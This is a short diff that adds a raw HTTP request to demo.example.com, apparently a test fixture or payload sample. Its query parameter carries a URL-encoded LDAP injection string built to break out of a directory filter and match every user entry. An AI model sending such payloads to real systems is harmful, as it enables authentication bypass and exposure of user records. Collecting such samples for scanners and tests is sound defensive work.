@@ -1,0 +1,4 @@
+GET /a?data=*)(%26(/*x*/objectClass%3Duser)(uid%3D*)) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
